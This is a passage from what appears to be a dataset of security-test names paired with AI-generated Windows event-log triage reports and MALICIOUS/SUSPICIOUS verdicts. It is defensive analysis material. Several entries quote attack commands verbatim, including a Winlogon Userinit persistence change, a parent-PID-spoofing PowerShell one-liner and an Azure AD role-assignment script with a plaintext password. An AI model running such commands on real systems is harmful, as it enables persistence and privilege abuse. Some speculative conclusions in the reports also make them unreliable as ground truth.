- While EdgeUpdate activities might be benign by themselves, within this context, they contribute to a pattern that merits closer examination.

### Guidance:
1. **Immediate Action**:
   - Conduct a full forensic analysis of the affected host focusing on memory artifacts and timeline of events.
   - Isolate the affected system to prevent further potential lateral movement or data exfiltration.

2. **Verify Changes**:
   - Examine the registry changes in-depth to determine the origin and timeline.
   - Identify and verify the legitimacy of ""AtomicTest.dll"" within the system.

3. **Log Analysis**:
   - Review any backup logs if available to perform a more comprehensive timeline analysis.
   - Enable more detailed logging and monitoring for enhanced visibility into this and connected systems.

Based on the findings discussed, the resolution for the current state of logs is **MALICIOUS** due to evident registry manipulation indicative of privilege escalation, coupled with log clearing, which is a strong sign of malicious activity."
Remote Process Injection with Go using NtQueueApcThreadEx WinAPI,"After a thorough analysis of the provided logs, here is a breakdown of the findings:

1. **Security Logs:**
   - Multiple security logs (event IDs: 4624, 4672, 5379, and 4798) indicate activities mostly stemming from the SYSTEM account and typical system processes like `services.exe`, `taskhostw.exe`, and `sc.exe`. 
   - Event ID 4672 shows an account was assigned highly privileged rights. This is standard for SYSTEM-level processes.
   - Events related to `MicrosoftAccount:user=02txoixylodcstop` in Event ID 5379 indicate credential reads from SYSTEM context, which resulted in a typical return code (3221226021) that indicates 'no such user' in certain environments.

2. **Sysmon Logs:**
   - The execution of processes such as `whoami.exe` and `conhost.exe` under the `admin_test` user account, displaying high integrity levels, points towards normal administrative tasks.
   - Notably, there is an execution of `powershell.exe` that runs `NtQueueApcThreadEx.exe` from a temporary directory. This is suspicious since `NtQueueApcThreadEx.exe` is not a known standard Windows executable and its placement in a temporary directory with PowerShell execution could indicate potentially malicious activity.

3. **Application Logs:**
   - Entries related to the Software Protection Platform Service don't raise any immediate red flags, showing normal operation.

4. **PowerShell Logs:**
   - The PowerShell logs depict a session initiated for a script running `NtQueueApcThreadEx.exe`, aligning with the Sysmon entry for the same process. This further reinforces the suspicious nature of this operation given its placement and invocation via PowerShell.

### Conclusion:
From analyzing the event logs, there is one concerning point centered around the execution of `NtQueueApcThreadEx.exe` using PowerShell. This file's execution path and the associated PowerShell command are unconventional and could be indicative of an attempt to execute code from an untrusted source.

### Resolution: 
- **SUSPICIOUS**: The logs indicate potentially suspicious activity surrounding the execution of `NtQueueApcThreadEx.exe` via PowerShell. This warrants further investigation to determine the legitimacy of this executable and its origin. An immediate check on the file's hash against known malware databases, a review of recent changes to the system, and monitoring for further suspicious activity are recommended."
Winlogon Userinit Key Persistence - PowerShell,"### Detailed Analysis

**1. PowerShell Logs:**

- The PowerShell logs indicate the execution of a specific PowerShell command via `cmd.exe`. The command being run is:
  ```powershell
  Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, C:\Windows\System32\cmd.exe"" -Force
  ```
- This command modifies the `Userinit` registry key, which can change the behavior of the user login process to launch `cmd.exe`, potentially escalating privileges or enabling persistence by executing a command shell every time a user logs on. Such activity is often associated with malicious attempts to maintain or gain unauthorized access.

**2. Sysmon Logs:**

- **Process Creation and Registry Key Modification:**
  - The logs show that `powershell.exe` was executed from a temporary directory. This is often suspicious as attackers tend to execute PowerShell scripts from non-standard locations to evade detection.
  - The parent process for `powershell.exe` was `wsmprovhost.exe`, which typically doesn't initiate PowerShell directly, raising further suspicion.
  - Associated Sysmon data confirms the registry modification by PowerShell and references the same powershell command.

- **Other Processes:**
  - Instances of tools like `whoami.exe` and `hostname.exe` being used by `admin_test`, a potentially compromised or malicious user account, might suggest attempts to gather information about the current logged on user or the host.
  - The use of `wevtutil.exe` could indicate attempts to query or clear event logs, which is a common tactic to cover tracks post-compromise.

**3. Application Logs:**

- The logs related to the Microsoft Edge Update service (`edgeupdate`) appear to be normal with no anomalies. These involve updates and registration processes that do not indicate malicious activity on their own.

### Assessment

- **Suspicious Activity:**
  - The modification of the `Userinit` registry key via PowerShell is highly unusual and indicative of potential malicious activity.
  - The use of legitimate system binaries (`whoami.exe`, `hostname.exe`, `wevtutil.exe`) possibly indicates a reconnaissance phase or attempts to maintain persistence while evading detection (e.g., through Windows Management Instrumentation).
  
- **Potential Threats/Risks Identified:**
  - Persistence mechanism potentially being established by altering user logon procedures.
  - Potential privilege escalation if `cmd.exe` is being run with higher privileges than initially granted.
  - Information gathering and possible log tampering to cover tracks.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Investigate the `admin_test` account for signs of compromise.
   - Review other systems for similar PowerShell execution patterns or registry modifications.
   - Look into `wsmprovhost.exe` activity to ascertain if it was compromised or used consciously for lateral movement.
   - Consider isolating `Server002` until a thorough investigation can clarify the extent of the compromise.

2. **Forensic Actions:**
   - Capture current memory and a complete disk image of `Server002` for further analysis.
   - Analyze network traffic logs for connections from or to suspicious external destinations during the time of the events.

3. **Long-term Mitigations:**
   - Implement more granular PowerShell logging (e.g., script block logging, module logging) for better visibility.
   - Enhance alerting for unusual registry key modifications related to user login settings.

**Resolution: MALICIOUS**

The behavior observed, especially the registry modification aimed at persistence via the user login process, strongly suggests malicious intent, warranting immediate containment and a thorough investigation."
Service Installation PowerShell,"Based on the provided logs, there are several items worth examining in detail:

1. **PowerShell Events:**
   - The PowerShell logs depict the execution of a script that creates a new service called ""fileTestService_PowerShell"" with a binary path pointing to `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\fileService.exe`. This behavior is suspicious as creating a new service with a binary in a temporary directory can be indicative of malware attempting to gain persistence on the system.

2. **System Events:**
   - The System log confirms the creation of the service ""fileTestService_PowerShell"" with the ImagePath matching what was executed in the PowerShell command. The service is set to auto start and is running under the ""LocalSystem"" account, which is a highly privileged context.

3. **Application Events:**
   - There is an event indicating that the ""fileService"" started successfully. No additional details about what this service does are provided, which raises red flags given its location and the context in which it was started.

4. **Sysmon Events:**
   - Multiple entries indicate PowerShell and other system utilities (wevtutil, conhost, whoami) running under the `SERVER002\admin_test` user account. There are no explicit signs of privilege escalation attempts within these entries.
   - The creation of the ""fileService.exe"" process is logged, running under the `NT AUTHORITY\SYSTEM` account, but lacks any details about its parent process, which is odd and can imply tampering or obfuscation attempts.
   - The EdgeUpdate processes seem routine for software updates, with no immediate signs of malicious intent from these events.

### Assessment:

- The logs suggest potentially suspicious activity primarily focused around the creation and execution of a service (`fileTestService_PowerShell`) from a temporary directory. This behavior is unusual and can indicate malicious activity aimed at establishing persistence on the system, particularly because it uses a temporary file location typically leveraged by malware.

### Guidance:

- **Immediate Actions:**
  - Quarantine the affected system to prevent any potential spread.
  - Review the contents and behavior of the `fileService.exe` file to determine if it is malicious. Use antivirus or sandbox analysis.
  - Investigate the user account (`SERVER002\admin_test`) and its activities around the time of these events to determine if it was compromised.
  - Disable or remove the ""fileTestService_PowerShell"" service and any other associated files if found malicious.

- **Further Investigation:**
  - Trace back any network connections or data transfers that the `fileService.exe` may have attempted.
  - Look for similar entries in event logs on other systems to ensure this is not part of a broader campaign.

### Resolution:
- **Resolution: MALICIOUS** - The creation of a service to run a binary from a temporary directory without clear legitimate purpose signifies high potential for malicious activity."
Remote Process Injection with Go using CreateRemoteThread WinAPI,"Upon reviewing the event logs provided, several observations can be made:

1. **Time Manipulation Observations**:
   - In both the System and Security logs, there are events indicating some irregularities with system time changes. Specifically, the events show discrepancies such as the time appearing to move backwards, which can sometimes be indicative of an attempt to cover tracks or manipulate logs.

2. **PowerShell Script Activity**:
   - Multiple PowerShell events (with Event ID 600) show the execution of potentially suspicious commands. Specifically, a PowerShell script attempts to start ""werfault.exe"" and follows it by executing ""CreateRemoteThread.exe"" with a -pid argument linked to the newly created process.
   - This action is particularly suspicious, as `CreateRemoteThread.exe` might be used for process injection purposes, a common technique used in malware attacks to execute malicious code in the context of another process.

3. **Suspicious Process Activity**:
   - Sysmon logs show an unusually high number of `conhost.exe` and `wevtutil.exe` processes being spawned by the user `SERVER002\admin_test`. Frequent and rapid spawning of these processes can indicate potentially malicious activity, particularly if they are being abused as part of a larger attack strategy.
   - The `CreateRemoteThread.exe` action also raises concerns as this can be associated with process hollowing - a technique used by malicious actors to hide the execution of their own code behind a legitimate process.

4. **Privileged Operations**:
   - The Security log contains Event ID 4672, which indicates that the user `admin_test` received special privileges, including `SeDebugPrivilege` which is typically only required for debugging and can be exploited if acquired by a malicious actor.

5. **Network/Login Anomalies**:
   - Event ID 4624 (logon event) shows a network logon type (type 3) from a workstation named `DESKTOP-3HL5B2P` using NTLM authentication, which could be legitimate but needs further verification to ensure it's not a lateral movement attempt.

Based on the analysis of these activities:

**Resolution: MALICIOUS**

- The execution of a PowerShell script initiating `werfault.exe` followed by `CreateRemoteThread.exe` is highly indicative of a process injection attempt, potentially aiming for stealthy execution within trusted processes.
- The time discrepancy events and the large volume of rapidly spawned processes (`conhost.exe`, `wevtutil.exe`) suggest activities consistent with anti-forensic practices or evasive maneuvers.
- Special privileges acquisition coupled with these actions further reinforces the likelihood of malicious intent.

**Guidance:**
- Immediately isolate the host (Server002) to prevent any potential lateral movement or data exfiltration.
- Perform a full forensic analysis on the system image to understand the scope and methods of the attack.
- Review network logs from the workstation `DESKTOP-3HL5B2P` and verify all administrative accounts and their recent activities.
- Update and, if necessary, fortify endpoint protection and monitoring policies to detect similar attempts in the future."
Parent PID Spoofing - Spawn from svchost.exe,"Upon reviewing the provided logs, certain elements stand out that suggest potential anomalous activity.

### Suspicious Behavior

1. **PowerShell Logs:**
   - There's a continuous use of PowerShell, which executes commands including `Get-CimInstance` to query processes and attempts to start a new PowerShell process with elevated privileges. The command:
     ```powershell
     powershell.exe & {Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter ""Name = 'svchost.exe' AND CommandLine LIKE '%'"" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -CommandLine '-Command Start-Sleep 10'}
     ```
     indicates an attempt to chain PowerShell sessions, which is suspicious if not justified by legitimate administrative needs.

2. **System Logs:**
   - Predominantly, the system logs are reporting Windows update-related activities, which generally appear benign. The updates are for various Microsoft components and are uniformly recorded in a short time span, suggesting an automated process.

3. **Security Logs:**
   - Logon events are centered around a particular account `SERVER002$` with a SYSTEM context and indicate attempts to access credentials that failed, specifically for a service labeled ""MicrosoftAccount:user"". Such attempts are displayed with return codes suggesting a repeated failure, which could hint at attempts to access or enumerate credentials.

4. **Sysmon Logs:**
   - Anomalous creation of PowerShell processes with varying timestamps and GUIDs. The execution of `hostname.exe` and `whoami.exe` indicates potential enumeration activity or system reconnaissance.
   - The appearance of `CompatTelRunner.exe` executing multiple times could be related to telemetry or potentially leveraged in some form of living-off-the-land (LOTL) attack scenario given its system-level permissions.

### Assessment

The activities outlined, particularly the repeated PowerShell commands attempting to leverage `Get-CimInstance` for processes like `svchost.exe` and subsequent elevated PowerShell executions in a precise, repetitive manner, demonstrate characteristics consistent with suspicious activity. Such behavior is notably common in various attack tactics, including process discovery and potential privilege escalation.

### Recommended Actions

1. **Investigate the Sources:**
   - Ensure all such PowerShell activities are legitimate. Investigate the origin of these commands to determine if they're part of automated administrative scripts or IT processes that run periodically.
   
2. **Audit User Accounts:**
   - Perform a comprehensive audit of accounts, particularly those with SYSTEM-level privilege, making sure the credentials and access attempts align with expected administrative activities.

3. **Increase Monitoring:**
   - Implement enhanced logging and alerting on PowerShell scripts, especially those initiated with high-integrity levels or processes linking to critical system operations like `svchost.exe`.

4. **Patch Management:**
   - Verify whether Windows Updates are indeed deploying legitimately and whether any post-deployment scripts or potential malware activity are being masked as updates, especially following telemetry execution.

### Conclusion

The combination of PowerShell activities, failed credential access, and system-level process executions without clear justification points towards potentially suspicious activity. This activity does not conclusively indicate a compromise but warrants further investigation to ensure the security posture of the host.

**Resolution: SUSPICIOUS** - The logs reveal indicators that warrant deeper investigation to rule out any malicious intent or activity."
WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique,"Upon conducting a thorough analysis of the provided event logs, several notable observations have been identified:

1. **Time Change Events (Event ID 4616 & Kernel-General Event ID 1)**:
   - There are multiple entries indicating changes in the system time (`EventID 4616` and `Kernel-General EventID 1`). This is often done maliciously to hide tracks, bypass security protocols reliant on time, or just an anomaly during network time sync. However, cross-referencing with the Time-Service Event (`EventID 35`) suggests that the system merely corrected its time with an internal or NTP server.

2. **Privilege Escalation and Logon Events**:
   - A significant activity is the `admin_test` user logging in remotely using NTLM authentication (`LogonType 3`) and executing high-privilege operations (`EventID 4672`) which grants debugging, take ownership, and other powerful privileges. This can be potentially suspicious if the account is typically not involved in such privileged activities.
   - The series of `EventID 4624` and `4634` indicate active session logons and logoffs for the `admin_test` user. The behavior seems normal ergonomically, though the usage of such a central account can require further context.

3. **Suspicious PowerShell Activity**:
   - A PowerShell command is executed that downloads and invokes a script from a GitHub repository (`Get-WinlogonTokenSystem.ps1`). This is notably suspicious and an indicator of potential compromise, possibly attempting token manipulation or privilege escalation via PowerShell (`Sysmon EventID 1` and `PowerShell EventID 600`).
   - This script execution with `iex` (Invoke-Expression) from an external source is viewed as a hallmark of malicious activity due to its capability to execute arbitrary code.

4. **Sysmon Process Creation Events**:
   - There are several process creations like `wevtutil.exe` and `conhost.exe` under the same user context (`SERVER002\\admin_test`). These processes are often benign and fundamental to system operations but could be leveraged in a post-compromise situation to enumerate or manipulate system logs.
   - A suspicious command execution via `powershell.exe` is directly linked to the `admin_test` user, matching the previously mentioned PowerShell script download activity, aligning with possible lateral movements or credential extraction efforts.

5. **Windows Defender State**:
   - Logs indicate that Windows Defender is operational (`Application EventID 15`), suggesting that at the time of logging, the system had active antivirus measures functioning.

**Conclusion and Recommendation:**
Given the analysis of the logs, the presence of a downloaded and executed PowerShell script from an external source without prior context is quite alarming and indicative of potentially malicious activity. The file names and the privilege escalation events suggest the possibility of later stages of a compromise attempt, potentially aimed at privilege escalation or persistence.

**Resolution: MALICIOUS**
- It is recommended to immediately isolate Server002 and launch a full forensic investigation, checking for any additional signs of compromise or persistence mechanisms that may have been established.
- Review the current security policies regarding remote access, especially the ones overseeing the `admin_test` account to prevent further misuse.
- Conduct a sweep to identify any other endpoints possibly affected based on similar event triggers and indicators.

Moving forward, enhance monitoring for unusual scripting activities, like PowerShell commands with external downloads and invocation, and fortify privileged account management practices."
Domain Password Policy Check: Common Password Use,"### Analysis of Windows Event Logs:

#### Observations:

1. **PowerShell Execution:** 
   - There are multiple instances where `powershell.exe` is executed. The command involves changing user account passwords using a script that references a credential file stored in the user's local app data directory (`$env:LOCALAPPDATA\\file\\$env:USERNAME.txt`). The script attempts to validate and modify user credentials, which is unusual and could potentially indicate malicious intent if unauthorized.

2. **Credential Handling Using PowerShell:**
   - The PowerShell script checks if the password stored in a local file matches a specific pattern (""Spring<current year>!""). If found, it attempts to change the Active Directory account password to the same. This kind of automated password handling, without secure storage practices or proper logging, is suspicious.

3. **Frequent Process Spawning:**
   - Utilities like `wevtutil.exe` and `whoami.exe` are executed frequently within a short timeframe. These are normal administrative utilities, but frequent, rapid execution may suggest scripted automation, which often aligns with certain attack vectors like recon or log manipulation.

4. **Installation and Updates:**
   - Multiple instances of `setup.exe` processes are related to Microsoft Edge updates. These activities appear triggered by legitimate Edge update processes under NT AUTHORITY\SYSTEM, which generally signifies regular software maintenance.

5. **Security Log Event:**
   - A security event (ID 4799) is observed where a setup process for Edge updates attempts user management operations referencing the Built-in Users group in Windows. This could simply be part of the installation routine but is worth noting if out of place in typical traffic.

#### Assessment:

- **Benign Activities:**
  - Process executions under NT AUTHORITY\SYSTEM for `svchost.exe` and `SearchProtocolHost.exe` appear normal as part of regular system operations.
  - Edge update-related entries seem consistent with expected system update behavior.

- **Suspicious Activities:**
  - The invocation of PowerShell for password management purposes warrants further investigation. The pattern of credentials being stored and manipulated may suggest poorly secured password management practices or even the potential for misuse if aligned with known threats exploiting compromised credentials.

#### Recommendations:

- Investigate the source and authorization of the PowerShell scripts impacting credential management. Validate that these scripts are sanctioned by IT policies and executed by trusted administrators.
- Review system integrity and security posture to ensure robust credential storage and handling practices are in place, potentially adjusting policies that govern scripts or automated administrative tasks.
- Conduct a review of system events surrounding the `wevtutil.exe` and related utility commands, ensuring that these are part of legitimate administrative tasks rather than indicative of attempts to clear logs or cover tracks.
- Monitor for recurrence or signs of similar behavior across systems, possibly indicating lateral movement or widespread practices contrary to organizational security standards.

### Resolution: **SUSPICIOUS**

The events point towards some activities, especially related to credential management via PowerShell, that seem atypical and could be either a benign but insecure process or an initial indicator of compromise. Further investigation is required to ascertain the intent and legitimacy of these actions."
WMI Invoke-CimMethod Scheduled Task,"Upon reviewing the various Windows event logs provided, several key observations and analyses can be made regarding potential suspicious or anomalous activity:

1. **Time Sync Activities (System Log)**:
   - Several entries, particularly EventID 24 and 1, indicate time changes. Entries suggest adjustments were made by `svchost.exe`, which is a legitimate process responsible for various background tasks, including time synchronization.
   - The time adjustments seem linked to `time.windows.com`, suggesting they were likely part of normal time synchronization activities. The associated process path and user account (`LOCAL SERVICE`) further reinforce that this is expected behavior.

2. **Suspicious PowerShell Activity (Sysmon and PowerShell Logs)**:
   - There are multiple entries showing the execution of `powershell.exe` with a command involving `Invoke-CimMethod` to register a scheduled task using XML.
   - PowerShell activity involving CIM and scheduled tasks without clear administrative intent can be suspicious, associated with task automation or persistence techniques by adversaries.
   - The PowerShell command reads an XML configuration from a temporary directory, a known tactic for persistence by attackers.

3. **Process Execution (Sysmon Logs)**:
   - Execution of utilities like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` under the same user account (`SERVER002\\admin_test`) can indicate a user checking system information or manipulating event logs (wevtutil).
   - While such commands may be commonplace in an investigative or administrative context, their combination, especially with PowerShell script execution, may indicate reconnaissance.

4. **Privileged Account Activity (Security Log)**:
   - User `admin_test` has several logon and privilege escalation activities. EventID 4672 indicates this user holds several powerful privileges like `SeDebugPrivilege` and `SeBackupPrivilege`.
   - While holding these privileges is typical for an administrative account, the timeline and conjunction with other activities raise concerns about potential misuse or illicit access.

5. **Network Service and System Activity (Application Log)**:
   - The entries from the Software Protection Platform Service and other system-level processes appear standard and are explained by routine system services and updates.

**Assessment**:
The combination of executing PowerShell scripts to adjust the Task Scheduler with XML, coupled with the use of system utilities, suggests potential suspicious activity. This is particularly elevated by commands being run in tandem, which may not fit typical daily administrative activity.

**Resolution**: **SUSPICIOUS**

Given these findings, the observed behavior in the logs should be marked as suspicious. There are indicators of possible malicious intent that require further investigation. Steps to proceed include:
- Validate the legitimacy of the `powershell.exe` command script and XML configuration file. Investigate the intent and origin of the file.
- Review the actions of the `admin_test` account, especially around the time of the observed activities, to ensure these actions are expected and authorized.
- Consider running additional forensic checks on the system to detect any persistence mechanisms or unauthorized changes.
- Monitor the system for further suspicious activity and lock down privileged accounts if necessary."
Azure AD - adding user to Azure AD role,"### Detailed Analysis of Windows Event Logs

Upon examining the provided logs, we focus on potentially suspicious activities based on the Windows PowerShell logs and Sysmon logs. Let's break down the findings:

#### Windows PowerShell Log Analysis:

1. **PowerShell Script Execution:**
   - A PowerShell script was executed on `Server002` with the following command:
     ```powershell
     powershell.exe & {Import-Module -Name AzureAD
     $PWord = ConvertTo-SecureString -String ""p4sswd"" -AsPlainText -Force
     $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""jonh@contoso.com"", $Pword
     Connect-AzureAD -Credential $Credential
     $user = Get-AzureADUser -Filter ""DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'""
     if ($user -eq $null) { Write-Warning ""User not found""; exit }
     $role = Get-AzureADDirectoryRole -Filter ""DisplayName eq 'Global Reader'""
     if ($role -eq $null) { Write-Warning ""Role not found""; exit }
     Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId
     Write-Host ""User $($user.DisplayName) was added to $($role.DisplayName) role""}
     ```
   - This script imports the AzureAD module, establishes a connection with AzureAD using credentials stored in plaintext (not secure), and attempts to add a user named ""SuperUser"" to the ""Global Reader"" role.

2. **Indicators of Potentially Suspicious Activity:**
   - **Plaintext Password:** Use of `ConvertTo-SecureString -String ""p4sswd"" -AsPlainText -Force` indicates that the password is stored in plaintext before being converted, which is a security risk.
   - **Account Privileges Modification:** Adding a user to a directory role implies privilege escalation, which can be significant if unwarranted or unauthorized.
   - **No Security Context:** The logs do not show any associated security context defining the validity of the actions performed.

#### Sysmon Log Analysis:

1. **Processes Executed:**
   - The following sequence of processes is noted:
     - `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
     - `C:\\Windows\\System32\\conhost.exe`
     - `C:\\Windows\\System32\\wevtutil.exe`
     - Multiple instances of `svchost.exe`.

2. **Process Relationships and Execution Integrity:**
   - The executions themselves appear routine in terms of certain system operations, such as hostname, whoami, etc.
   - The critical interaction occurs with `powershell.exe`, suggesting that it might be linked to the PowerShell script execution identified earlier.

3. **Execution Context:**
   - Activities conducted under `SERVER002\\admin_test`, which should be validated against expected administrative activities.

### Assessment of the Situation

- **Suspicious Indicators**: Activities surrounding the PowerShell script execution, mainly the plaintext password usage and the potential unauthorized modification of AzureAD roles, could indicate preparation for or execution of a privilege escalation.

- **Potential Risks**: Unauthorized access and privilege escalation within AzureAD could lead to significant exposure, potential data exfiltration, or further system compromises.

### Guidance on Next Steps

- **Verify Legitimacy**: Determine whether the `admin_test` actions were authorized, and verify if the alteration of directory roles had a legitimate business purpose.
- **Harden Credentials Handling**: Replace passwords handled in plaintext within scripts and ensure secure credential handling techniques are enforced.
- **Audit Role Changes**: Log and audit all directory role changes to ensure they align with organizational policies, especially for privileged roles.
- **Increase Monitoring**: Enhance logging and alerting around PowerShell executions and modify logs to capture both script contents and context for comprehensive threat analysis.

### Resolution: SUSPICIOUS

Although there's no direct evidence confirming malicious intent, the combination of unusual Privilege Role modification attempts, credential handling practices, and the process execution sequences demand a more thorough investigation. The flagged behavior should be treated as **SUSPICIOUS** and subjected to further inquiry to rule out or confirm malicious activities."
SystemBC Malware-as-a-Service Registry,"### Detailed Analysis of the Logs:

#### **Security Log Analysis**:
- **Event ID 4616** involves changes to the system time, executed by the `svchost.exe` process. While this can be benign, unauthorized time changes could indicate an attempt to manipulate timestamps in logs or modify the system clock to correspond with malicious activity.

#### **Application Log Analysis**:
- The presence of `edgeupdate` stopping could suggest service disruption. However, without other supporting evidence, this alone doesn't indicate a direct threat.

#### **System Log Analysis**:
- **Event ID 1 and 24** involves kernel time changes. These correlate with the Security logs showing time changes by `svchost.exe`. This could potentially be suspicious if there is no legitimate reason for frequent system time updates.

#### **Windows PowerShell Log Analysis**:
- The logs show PowerShell activity involving the setting of a RunKey with a PowerShell script executing with bypass flags (`-ExecutionPolicy Bypass -File`) and hidden window style. This is suspicious as it can indicate persistence mechanisms installed by malware or unauthorized scripts.

#### **Sysmon Log Analysis**:
- Multiple instances of the `wevtutil.exe` and `conhost.exe` show process creation and activity, possibly indicative of system log handling or manipulation under the `admin_test` account. Also, a PowerShell execution with obfuscated command line arguments reinforces the concern found in the PowerShell logs.
  
- Active processes such as `powershell.exe` with command lines resembling obfuscation or hidden execution can signify malicious intentions or persistence mechanisms being executed.

### Assessment:

Based on the analysis, several indicators point towards potentially malicious activity:
- **PowerShell Usage**: The setting of RunKey for PowerShell to run with execution policy bypass is typically used by malware for persistence, evading script block logging and other defenses.
  
- **Time Changes**: Frequent and seemingly unnecessary changes to system time by known processes such as `svchost.exe`, particularly without clear justification, can indicate malicious activities such as attempts to hinder log correlation or clock modification malware.

### Conclusion:

Given the observations, particularly the PowerShell command and the suspicious time modifications, the activity can be classified as **SUSPICIOUS**. Further investigation is needed to confirm whether these activities have been authorized or if they're signs of a security incident. 

### Guidance on How to Proceed:
1. **Further Investigation**: Conduct a deeper forensic investigation into the PowerShell scripts and any scheduled tasks or RunKeys.
2. **Monitor Time Changes**: Review system time change logs and validate if legitimate administrative tasks justify such changes.
3. **User Activity**: Investigate the actions of the `admin_test` account, especially around the times these logs were generated.
4. **Endpoint Security Review**: Ensure endpoint detection and response tools are capturing detailed events around these suspicious activities.
5. **Threat Intelligence**: Correlate findings with external threat intelligence for known indicators of compromise.

Implementing these actions will help determine if the activity can be conclusively deemed malicious or if authorization was given through legitimate administrative actions."
Powershell Cmdlet Scheduled Task,"**Detailed Analysis:**

**1. PowerShell Log Analysis:**
- Multiple PowerShell script execution logs are observed within the Windows PowerShell logs. The significant line in the logs is a PowerShell script that creates a new scheduled task with the following attributes:
  - **Action**: Execute `calc.exe`
  - **Trigger**: AtLogon
  - **User**: Runs as **BUILTIN\\Administrators** with the highest run level.
  - This script appears to be an attempt to execute `calc.exe` upon user logon with administrator privileges.

This execution, especially with scheduling a task to run under BUILTIN\Administrators using PowerShell, is an indicator of suspicious behavior. Although `calc.exe` is a benign Windows application, creating scheduled tasks in this manner can be commonly associated with persistence mechanisms used by malware to maintain access on the system.

**2. Sysmon Log Analysis:**
- Numerous events involving processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and `svchost.exe`.
- **Particularly Suspicious Event:**
  - `PowerShell.exe` is invoked with a suspicious command line to register a scheduled task that executes `calc.exe` under administrator rights.

The combination of these operations within a narrow timeframe suggests the usage of legitimate tools/scripts for potentially illegitimate purposes, a technique known as ""living off the land"".

**3. Application Log Analysis:**
- Event log entry from the ""Software Protection Platform Service"" showing time-stamped operations of routine checks and updates.

**Conclusion:**

- The presence of a script attempting to execute `calc.exe` via a scheduled task running with high privileges suggests anomalous behavior, especially given the method (PowerShell script) and timing of execution.
- While `calc.exe` itself is not malicious, the mechanism for its execution marks an atypical activity that should not normally occur in standard administration tasks.
  
**Assessment:**
- **Resolution: SUSPICIOUS**

**Guidance:**
- Conduct further investigation into the origin of the PowerShell script: Inspect recent user activities, any unauthorized script files, or rogue accounts.
- Analyze network logs for any unusual outbound connections correlating with the timeline of these events.
- Consider isolating the host machine and performing a security health check or malware scan.
- Review task scheduler for any unauthorized tasks and remove them as needed.
- Enhance monitoring for any future unauthorized script or task execution attempts."
Suspicious bat file run from startup Folder,"Upon reviewing the provided Windows event logs, there are several key points of interest:

1. **PowerShell Activity:**
   - There is a PowerShell command that includes copying a batch file (`batstartup.bat`) to the Startup folder for both the current user and for all users, and then executing it through `Start-Process`. This behavior is suspicious as the Startup folder is typically modified to achieve persistence, allowing the file to be executed every time the system starts.
  
2. **Processes Initiated:**
   - Multiple executions of `whoami.exe` and `hostname.exe` are noted. While running these commands by themselves is not necessarily indicative of malicious actions (as they provide information on the current user and computer name), it is important to note the context in which they are executed. In this case, they seem to be executed together with the suspicious PowerShell script.
  
3. **Change in System Time:**
   - There are repeated adjustments of the system time (`EventID: 4616`), shifting back and forth between two close timestamps. This might be an attempt to manipulate the system clock, although the specific reason for these changes is unclear from this data alone.

4. **Process Execution:**
   - There are instances of native Windows utilities like `conhost.exe`, and `wevtutil.exe`. In some contexts, misuse of these tools can be indicative of malicious activities if used to hide or alter logs, especially when paired with suspicious activity like unauthorized file modifications or unexpected PowerShell scripts.

### Assessment and Conclusion:

Based on the observed PowerShell activity designed to persist a `.bat` file in the startup directory, coupled with the execution of multiple native Windows executables indicative of reconnaissance (such as `whoami.exe`), there is sufficient evidence to classify this activity as indicative of potential malicious intent.

While the presence of legitimate Windows utilities (`wevtutil.exe`, `whoami.exe`, `conhost.exe`, etc.) is generally benign, their usage in combination with suspicious PowerShell scripts warrants further investigation.

Resolution: **MALICIOUS**

### Recommended Action:

- **Immediate Response:**
  - Isolate the affected system (Server002) from the network to prevent potential propagation or further malicious activity.
  
- **Forensic Analysis:**
  - Conduct a full forensic investigation to analyze the `batstartup.bat` file for any malicious content or actions they may perform.
  - Investigate the source of the PowerShell script and check if similar scripts were executed on other systems.

- **Audit and Monitor:**
  - Review user account activities, especially for `SERVER002\admin_test`, to ensure no unauthorized changes or malicious intent.
  - Enhance logging and monitoring for similar PowerShell and other native tool executions across the enterprise network.

- **Patch and Protect:**
  - Ensure all systems are up to date with the latest security patches.
  - Educate users on phishing and social engineering tactics that might lead to such scripts being executed."
Add persistance via Recycle bin,"Upon analyzing the provided log entries, the following observations and potential security concerns have been identified:

### Observations:

1. **Application Logs:**
   - Logs indicate that the `edgeupdate` service was stopped twice in quick succession on the system (`Server002`). This in itself is not inherently malicious, but repeated stopping or starting of services can sometimes be a sign of tampering.

2. **Sysmon Logs:**
   - Multiple executions of `wevtutil.exe` and `conhost.exe` under the `SERVER002\admin_test` user around the same timestamp (2024-10-27 15:37:02). The frequent use of `wevtutil.exe` may suggest manipulation of event logs, which is a common technique employed by malicious actors to cover their tracks.
   - There is an execution of `cmd.exe` with a command line designed to modify the Windows registry to set the ""Recycle Bin"" open command to launch the calculator app (`calc.exe`). This behavior is highly suspicious and suggests a registry modification attack.
   - Use of `whoami.exe`, `hostname.exe` under an admin account can often be normal, but given the sequence and context, it could be part of pre-attack reconnaissance.
   - `MicrosoftEdgeUpdate.exe` is executing multiple times with various commands. While these might look like standard update operations, the frequency and variety could suggest something beyond normal update activities.

3. **Privilege and User Context:**
   - The commands are being run under a high integrity level (`High`) and by a user who appears to have administrative privileges (`SERVER002\admin_test`), indicating they have significant control over the system.

### Security Concerns:

- **Registry Manipulation:** The command executed by `cmd.exe` to modify the registry entry to launch `calc.exe` is plainly malicious. Such behavior typically indicates an attempt to establish persistence on the system.
- **Log Tampering Suspicion:** The use of `wevtutil.exe` could indicate attempts to tamper with event logs, although this assumption would require further investigation to confirm.
- **Edge Update Process Frequency:** While it usually resides within the legitimate activities of updating applications, the frequency and diversity of `MicrosoftEdgeUpdate.exe` command lines suggest potential misuse or triggering by some other process.

### Conclusion:

**Resolution:** MALICIOUS

Given the attempted registry key change to alter system behavior, frequent execution under admin privileges, and potential log tampering, the activities documented in the event logs strongly indicate malicious intentions. Immediate response actions are recommended, including:

